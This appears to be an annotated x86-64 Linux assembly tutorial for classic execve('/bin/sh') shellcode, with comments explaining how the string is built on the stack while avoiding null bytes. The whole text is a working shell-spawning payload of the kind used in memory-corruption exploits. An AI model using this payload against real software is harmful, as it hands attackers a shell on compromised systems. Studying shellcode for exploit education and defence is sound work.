section .text ; Text section for code
global _start ; Begins execution at _start
_start:

; Get 59 in RAX
xor rax, rax ; Clear the RAX register
mov al, 59 ; Syscall for execve

; Push a string terminator onto the stack
xor rbx, rbx ; Sets RBX to NULL
push rbx ; Pushes a NULL byte onto the stack

; Push /bin/sh onto the stack, and get a pointer to it in RDI
mov ebx, 0x68732f6e ; Moves "n/sh" (written backwards in ASCII) into lower-end bits of RBX
shl rbx, 16 ; Pushes "n/sh" to the left to make more room for 2 more bytes in RBX
mov bx, 0x6962 ; Move "bi" into lower-end bits of RBX. RBX is now equal to "bin/sh" written backwards
shl rbx, 16 ; Makes 2 extra bytes of room in RBX
mov bh, 0x2f ; "Moves /" into RBX. RBX is now equal to "\x00/bin/sh" written backwards
             ; Note that we are moving 0x2f into bh, not bl. So there is a NULL byte at the beginning
push rbx ; Push the string onto the stack
mov rdi, rsp ; Get a pointer to the string "\x00/bin/sh" in RDI
add rdi, 1 ; Add one to RDI, which will get rid of the NULL byte at the beginning.
           ; RDI now points to a string that equals "/bin/sh"

; Make these values NULL
xor rsi, rsi
xor rdx, rdx

; Call execve()
syscall
